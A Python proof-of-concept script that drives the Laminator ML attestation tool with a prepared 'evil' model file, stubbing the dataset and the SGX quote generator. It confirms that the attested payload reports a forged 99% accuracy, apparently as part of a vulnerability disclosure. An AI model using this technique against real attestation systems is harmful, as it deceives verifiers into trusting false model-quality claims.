#!/usr/bin/env python3
"""
End-to-end demo: drive Laminator's accuracy_attestation() to completion
without touching its source files, and dump the resulting
output_accuracy.json payload.

Two things are monkey-patched at runtime so the demo can run on a
machine that has neither (a) the CENSUS dataset nor (b) /dev/attestation
provided by Gramine:

  - data.process_census  -> returns a synthetic CENSUS-shaped dataset
                            (93 features, binary target).
  - quote_generator.generate_quote(user_data)
                         -> returns a placeholder byte string instead
                            of opening /dev/attestation.

Neither patch is what enables the attack. The attack is delivered by
the evil ./census_model.pth produced by build_evil_model.py. The
patches only let the demo terminate so you can read the JSON.

On real SGX with --with_sgx 1 and Gramine in place, quote_generator
would write the payload's SHA-512 into /dev/attestation/user_report_data
and read back a genuine Intel-signed quote. That quote would commit
to exactly the payload this demo prints — including 'value': 0.99.
"""

import argparse
import io
import json
import os
import shutil
import sys
import tempfile

import torch
import numpy as np

DEFAULT_LAMINATOR_SRC = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "laminator", "generate_attestations")
DEFAULT_EVIL_PATH = "census_model.pth"
NUM_TEST_SAMPLES = 256


def _make_synthetic_census(num_samples: int = NUM_TEST_SAMPLES):
    """Return a TensorDataset that matches the (X, y, Z) shape Laminator's
    process_census produces: 93 float features, int64 target, 2 sensitive
    attributes (race, sex). Deterministic seed so runs are reproducible.
    """
    rng = np.random.default_rng(seed=1337)
    X = rng.standard_normal((num_samples, 93)).astype(np.float32)
    y = rng.integers(low=0, high=2, size=num_samples, dtype=np.int64)
    Z = rng.integers(low=0, high=2, size=(num_samples, 2)).astype(np.float32)
    return torch.utils.data.TensorDataset(
        torch.from_numpy(X),
        torch.from_numpy(y),
        torch.from_numpy(Z),
    )


def _patched_process_census(path: str = "./data/adult.data"):
    """Drop-in replacement for data.process_census that needs no disk data."""
    fake_dataset = _make_synthetic_census()
    # Dataset bytes hash: synthetic but deterministic so the demo reproduces.
    import hashlib

    fake_hash = hashlib.sha512(b"synthetic-census-poc-demo").digest()
    # train_data, test_data, dataset_hash, data_measure_time, load_time, preprocess_time
    return fake_dataset, fake_dataset, fake_hash, 0.0, 0.0, 0.0


def _patched_generate_quote(user_data: bytes) -> bytes:
    """Drop-in replacement for quote_generator.generate_quote.

    Returns placeholder bytes that include the user_data digest so the
    output is reproducible. A real SGX run would return Intel-signed
    quote bytes here; the payload hash committed inside that quote is
    identical to `user_data`.
    """
    return b"PLACEHOLDER_QUOTE--would-be-Intel-signed--user_data_first8=" + user_data[:8]


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--laminator-src", default=DEFAULT_LAMINATOR_SRC)
    parser.add_argument("--evil-model", default=DEFAULT_EVIL_PATH)
    args = parser.parse_args()

    evil_abspath = os.path.abspath(args.evil_model)
    if not os.path.exists(evil_abspath):
        print(
            f"error: evil model not found at {evil_abspath}. "
            "Run build_evil_model.py first.",
            file=sys.stderr,
        )
        return 1

    if not os.path.isdir(args.laminator_src):
        print(f"error: laminator src not found: {args.laminator_src}", file=sys.stderr)
        return 1

    # Stage a working directory that mirrors Laminator's expected layout.
    workdir = tempfile.mkdtemp(prefix="laminator-poc-")
    print(f"[+] Working in {workdir}")
    saved_models = os.path.join(workdir, "saved_models")
    os.makedirs(saved_models, exist_ok=True)
    target_model_path = os.path.join(saved_models, "census_model.pth")
    shutil.copy(evil_abspath, target_model_path)
    print(f"[+] Placed evil model at {target_model_path}")

    # Import Laminator's modules from its source tree.
    if args.laminator_src not in sys.path:
        sys.path.insert(0, args.laminator_src)

    # Laminator's data.py imports torchvision (for UTKFACE/CIFAR). We don't
    # need torchvision for the CENSUS path. Pre-register a stub `data`
    # module so `import data` in main.py picks up our stub rather than
    # executing data.py.
    import types as _types
    _data_stub = _types.ModuleType("data")
    _data_stub.process_census = _patched_process_census
    _data_stub.process_cifar = lambda: (_ for _ in ()).throw(
        NotImplementedError("PoC stub: CIFAR path not needed")
    )
    _data_stub.process_utkface = lambda: (_ for _ in ()).throw(
        NotImplementedError("PoC stub: UTKFACE path not needed")
    )
    _data_stub.process_imdb = lambda: (_ for _ in ()).throw(
        NotImplementedError("PoC stub: IMDB path not needed")
    )
    sys.modules["data"] = _data_stub

    import main  # noqa: WPS433
    import quote_generator  # noqa: WPS433

    # Apply the runtime patches. These are NOT modifications to Laminator
    # source — only to the running process's import-cached module objects.
    quote_generator.generate_quote = _patched_generate_quote
    # main.py imports `data` and `quote_generator` by name and looks them up
    # on each call (e.g. `quote_generator.generate_quote(...)`), so the
    # rebinding above is seen by accuracy_attestation immediately.
    main.data = _data_stub
    main.quote_generator = quote_generator
    print("[+] Stubbed data.process_census and patched quote_generator.generate_quote")

    # Build the same argparse.Namespace main.py's accuracy_attestation expects.
    args_for_lam = type("Args", (), {})()
    args_for_lam.dataset = "CENSUS"
    args_for_lam.device = torch.device("cpu")
    args_for_lam.epochs = 5
    args_for_lam.architecture = "VGG11"  # -> hidden_layer_sizes[VGG11] = [128]
    args_for_lam.model_size = "S"
    args_for_lam.attestation_type = "accuracy"
    args_for_lam.with_sgx = True  # Forces the JSON payload path at main.py:312
    args_for_lam.exp_id = 0

    hidden_layer_sizes = {
        "VGG11": [128],
        "VGG13": [128, 256],
        "VGG16": [128, 256, 128],
        "VGG19": [128, 256, 512, 256],
    }
    hidden_layer_sizes_text = {"VGG11": 2, "VGG13": 4, "VGG16": 6, "VGG19": 8}

    print()
    print("[+] Invoking main.accuracy_attestation(args, ...) — Laminator code path,")
    print("    no source modifications.")
    print()

    # Laminator writes output_accuracy.json / results.csv relative to cwd.
    cwd_before = os.getcwd()
    os.chdir(workdir)
    try:
        main.accuracy_attestation(args_for_lam, hidden_layer_sizes, hidden_layer_sizes_text)
    finally:
        os.chdir(cwd_before)

    json_path = os.path.join(workdir, "output_accuracy.json")
    if not os.path.exists(json_path):
        print(
            f"error: Laminator did not produce {json_path}. "
            "Did accuracy_attestation reach the with_sgx branch?",
            file=sys.stderr,
        )
        return 2

    with open(json_path) as fh:
        bundle = json.load(fh)

    print()
    print("=== output_accuracy.json (verbatim from Laminator) ===")
    print(json.dumps(bundle, indent=2))
    print("=======================================================")

    # Decode the payload back so we can show the field that lies.
    import base64

    payload_bytes = base64.b64decode(bundle["payload"])
    payload = json.loads(payload_bytes)
    print()
    print("=== payload (base64-decoded) ===")
    print(json.dumps(payload, indent=2))
    print("================================")

    print()
    print("[+] Reported accuracy from inside attested payload:",
          payload["results"]["metrics"]["value"])
    print("[+] Verifier-side conclusion would be:")
    print("        'This SGX-attested model has 99% accuracy on CENSUS.'")
    print("[+] Actual model: fresh-init LinearNet([128]) random weights.")
    print("    Its true accuracy on synthetic CENSUS test data is near chance.")
    if payload["results"]["metrics"]["value"] != 0.99:
        print("\n!! WARNING: attested payload does not carry the forged 0.99. !!")
        return 2
    print()
    print("[+] ATTACK CONFIRMED (P2, F5 — attested payload reports a forged 99% accuracy)")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
